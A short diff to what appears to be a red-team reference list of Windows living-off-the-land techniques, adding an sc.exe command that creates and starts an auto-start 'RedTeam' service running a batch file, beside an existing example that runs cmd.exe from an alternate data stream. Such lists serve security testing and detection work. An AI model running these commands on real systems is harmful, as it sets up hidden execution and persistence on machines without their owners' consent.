@@ -200,6 +200,8 @@ c:\windows\system32\sc.exe
 c:\windows\sysWOW64\sc.exe
 sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto     
 sc start evilservice     
+sc create "RedTeam" start=auto displayname= "RedTeam" binpath="c:\users\Public\1.bat" 
+sc start RedTeam
 
 Execution - SCRIPTRUNNER
 c:\windows\system32\scriptrunner.exe
